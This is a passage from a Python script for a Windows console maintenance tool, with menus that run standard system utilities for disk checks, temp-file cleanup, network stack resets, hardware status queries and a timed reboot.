                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '3':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: MalwareScan (Launches the Malicious Software Removal Tool)...\033[0m\n")
                    os.system("start mrt")
                    print("\033[1m\033[92m[✓] Started\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '4':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: DriveHealth (Checks the S.M.A.R.T. health status of storage drives)...\033[0m\n")
                    os.system("wmic diskdrive get model,status")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '5':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Peripherals (Audits the status of Network, Audio, Camera, and Display devices)...\033[0m\n")
                    os.system('powershell "Get-NetAdapter | Select-Object Name, Status"')
                    os.system('powershell "Get-PnpDevice -Class Camera, AudioEndpoint | Select-Object Status, Class, FriendlyName"')
                    os.system('wmic path Win32_VideoController get Name, Status')
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '6':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Uptime (Displays the system uptime since the last reboot)...\033[0m\n")
                    os.system("net statistics workstation")
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '7':
                try:
                    print("\n\033[93mSave Battery Report? (Y/N)\033[0m")
                    save_choice = input("\033[1m\033[96mChoice: \033[0m").strip().lower()
                    if save_choice == 'y' or save_choice == 'yes':
                        print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Battery (Generates and saves a detailed Battery Health Report)...\033[0m\n")
                        report_path = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'Battery_Report.html')
                        os.system(f'powercfg /batteryreport /output "{report_path}"')
                        print(f"\n\033[1m\033[92m[✓] Saved: {report_path}\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '0':
                break

    def internet_fixer_menu():
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("\n\033[1m\033[95m" + "="*70 + "\033[0m")
            print("\033[1m\033[97m                INTERNET FIXER                \033[0m")
            print("\033[1m\033[95m" + "="*70 + "\033[0m")
            print("\033[93m1. \033[97mFlush\033[0m")
            print("\033[93m2. \033[97mResetWinsock\033[0m")
            print("\033[93m3. \033[97mResetIP\033[0m")
            print("\033[93m4. \033[97mPing\033[0m")
            print("\033[93m5. \033[97mTrace\033[0m")
            print("\033[93m6. \033[97mSpeed\033[0m")
            print("\033[93m7. \033[97mTraffic\033[0m")
            print("\033[92m8. \033[97mRepair\033[0m")
            print("\033[93m9. \033[97mGigabit\033[0m")
            print("\033[91m0. \033[97mBack\033[0m")
            print("\033[1m\033[95m" + "="*70 + "\033[0m")
            
            choice = input("\033[1m\033[96mChoice: \033[0m")
            
            if choice == '1':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Flush (Clears the DNS resolver cache)...\033[0m\n")
                    os.system("ipconfig /flushdns")
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '2':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: ResetWinsock (Resets Windows Sockets configuration)...\033[0m\n")
                    os.system("netsh winsock reset")
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '3':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: ResetIP (Resets TCP/IP stack configuration)...\033[0m\n")
                    os.system("netsh int ip reset")
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '4':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Ping (Tests internet connectivity by pinging Google)...\033[0m\n")
                    os.system("ping google.com")
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '5':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Trace (Traces the network route to Google to detect drops)...\033[0m\n")
                    os.system("tracert google.com")
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '6':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Speed (Displays the active network adapter's link speed)...\033[0m\n")
                    os.system("wmic nic where \"NetEnabled='true'\" get name, Speed")
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '7':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Traffic (Lists all active network connections and listening ports)...\033[0m\n")
                    os.system("netstat -ab")
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '8':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Repair (Executes a complete suite of network reset and repair tools)...\033[0m\n")
                    os.system("ipconfig /flushdns")
                    os.system("netsh winsock reset")
                    os.system("netsh int ip reset")
                    os.system("wmic nic where \"NetEnabled='true'\" get name, Speed")
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '9':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Gigabit (Opens Network Connections to manually configure 1Gbps duplex)...\033[0m\n")
                    os.system("start ncpa.cpl")
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '0':
                break

    def health_checkup_menu():
        reboot_status = run_cmd("powershell \"if((Test-Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update\\RebootRequired') -or (Test-Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Component Based Servicing\\RebootPending') -or (Test-Path 'HKLM:\\SOFTWARE\\Microsoft\\ServerManager\\CurrentRebootAttempts')){Write-Output 'YES'}else{Write-Output 'NO'}\"")
        update_status = run_cmd("powershell \"try{$s=(New-Object -ComObject Microsoft.Update.Session).CreateUpdateSearcher();$s.Online=$false;$c=$s.Search('IsInstalled=0').Updates.Count;if($c -gt 0){Write-Output 'YES'}else{Write-Output 'NO'}}catch{Write-Output 'UNKNOWN'}\"")

        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("\n\033[1m\033[95m" + "="*70 + "\033[0m")
            print("\033[1m\033[97m           HEALTH CHECKUP           \033[0m")
            print("\033[1m\033[95m" + "="*70 + "\033[0m")
            
            r_color = "\033[91m" if "YES" in reboot_status else "\033[92m"
            u_color = "\033[91m" if "YES" in update_status else "\033[92m"
            print(f"\033[96mRestart Required: {r_color}{reboot_status}\033[0m")
            print(f"\033[96mUpdates Pending: {u_color}{update_status}\033[0m")
            print("\033[1m\033[95m" + "-"*70 + "\033[0m")
            
            print("\033[93m1. \033[97mScan\033[0m")
            print("\033[93m2. \033[97mPurge\033[0m")
            print("\033[93m3. \033[97mOptimize\033[0m")
            print("\033[93m4. \033[97mCleanup\033[0m")
            print("\033[93m5. \033[97mVerify\033[0m")
            print("\033[92m6. \033[97mDiagnostic\033[0m")
            print("\033[93m7. \033[97mMonitor\033[0m")
            print("\033[93m8. \033[97mReboot\033[0m")
            print("\033[91m0. \033[97mBack\033[0m")
            print("\033[1m\033[95m" + "="*70 + "\033[0m")
            
            choice = input("\033[1m\033[96mChoice: \033[0m")
            
            if choice == '1':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Scan (Scans the file system for logical disk errors using CHKDSK)...\033[0m\n")
                    os.system("chkdsk C: /scan")
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '2':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Purge (Cleans up recycle bin and temporary files)...\033[0m\n")
                    os.system("powershell -Command \"Clear-RecycleBin -Force -ErrorAction SilentlyContinue\"")
                    os.system("powershell -Command \"Remove-Item -Path $env:TEMP\\* -Recurse -Force -ErrorAction SilentlyContinue\"")
                    os.system("powershell -Command \"Remove-Item -Path 'C:\\Windows\\Temp\\*' -Recurse -Force -ErrorAction SilentlyContinue\"")
                    fake_progress_bar(2.5, "Purging")
                    print("\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '3':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Optimize (Cleans up the Windows component store using DISM)...\033[0m\n")
                    os.system("dism /online /cleanup-image /startcomponentcleanup")
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '4':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Cleanup (Runs the advanced disk cleanup utility)...\033[0m\n")
                    os.system("cleanmgr /sagerun:1 | cleanmgr /verylowdisk")
                    fake_progress_bar(3.0, "Cleanup")
                    print("\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '5':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Verify (Scans and repairs corrupted system files using SFC)...\033[0m\n")
                    os.system("sfc /scannow")
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '6':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Diagnostic (Runs a full suite of health, cleaning, and integrity checks)...\033[0m\n")
                    os.system("chkdsk C: /scan")
                    os.system("powershell -Command \"Clear-RecycleBin -Force -ErrorAction SilentlyContinue\"")
                    os.system("powershell -Command \"Remove-Item -Path $env:TEMP\\* -Recurse -Force -ErrorAction SilentlyContinue\"")
                    os.system("dism /online /cleanup-image /startcomponentcleanup")
                    os.system("cleanmgr /verylowdisk")
                    os.system("sfc /scannow")
                    print("\n\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '7':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Monitor (Opens the Windows Reliability Monitor to check crash logs)...\033[0m\n")
                    os.system("start perfmon /rel")
                    print("\033[1m\033[92m[✓] Done\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '8':
                try:
                    print("\n\033[1m\033[93m[>>>] PROCESS STARTED: Reboot (Initiates a system reboot in 15 seconds)...\033[0m\n")
                    os.system("shutdown /r /t 15")
                    print("\033[1m\033[92m[✓] Rebooting in 15s\033[0m")
                    input("\n\033[90mEnter to continue...\033[0m")
                except KeyboardInterrupt:
                    print("\n\033[1m\033[91m[!] Stopped by user.\033[0m")
                    time.sleep(1)
            elif choice == '0':
                break

    def tools_menu(data):
        menu_text = r"""
         __  __ _____ _   _ _   _   ____   _    ____  
        |  \/  | ____| \ | | | | | |  _ \ / \  |  _ \ 
        | |\/| |  _| |  \| | | | | | |_) / _ \ | |_) |
        | |  | | |___| |\  | |_| | |  _ < ___ \|  _ < 
        |_|  |_|_____|_| \_|\___/  |_| \_\_/ \_\_| \_\
        """
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("\n\033[1m\033[95m" + "="*70 + "\033[0m")
            print("\033[1m\033[96m" + menu_text + "\033[0m")
            print("\033[1m\033[95m" + "="*70 + "\033[0m")
            print("\033[93m1. \033[97mHealth Checkup & Fixer\033[0m")
            print("\033[93m2. \033[97mInternet Fixer\033[0m")
            print("\033[93m3. \033[97mSecurity & Hardware Diagnostics\033[0m")
            print("\033[93m4. \033[97mBBIPL Admin\033[0m")
            print("\033[93m5. \033[97mHelp\033[0m")
            print("\033[91m0. \033[97mBack\033[0m")
            print("\033[1m\033[95m" + "="*70 + "\033[0m")
            
            choice = input("\033[1m\033[96mChoice: \033[0m")
            
            if choice == '1':
                health_checkup_menu()
            elif choice == '2':
                internet_fixer_menu()
            elif choice == '3':
                security_hardware_menu()
            elif choice == '4':
                bbipl_admin_menu(data)
            elif choice == '5':
                help_menu()
            elif choice == '0':
                break

    def main():
        maximize_console()
        progress_animation()
        system_data = fetch_data(silent=False, full_refresh=True)
        
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            display_connection_status(system_data)
            print("\n\033[1m\033[95m" + "="*70 + "\033[0m")
            print("\033[1m\033[93m GO TO MENU (M) | QUIT (Ctrl+Q) \033[0m")
            
            start_time = time.time()
            action = None
            while time.time() - start_time < 5.0:
                if msvcrt.kbhit():
                    key = msvcrt.getch()
                    if key == b'\x11':
                        action = 'quit'
                        break
                    elif key.lower() == b'm':
                        action = 'menu'
                        break
                time.sleep(0.1)
                
            if action == 'menu':
                tools_menu(system_data)
            elif action == 'quit':
                os.system('cls' if os.name == 'nt' else 'clear')
                print("\n\033[1m\033[92mExiting...\033[0m")
                time.sleep(1.5)
                os._exit(0)
            else:
                system_data = fetch_data(silent=True, full_refresh=False, existing_data=system_data)

    if __name__ == "__main__":
        main()

except Exception as e:
    print(f"\n\033[1m\033[91mCRITICAL CRASH PREVENTED. Error Details:\n{e}\033[0m")
    input("\nPress Enter to exit...")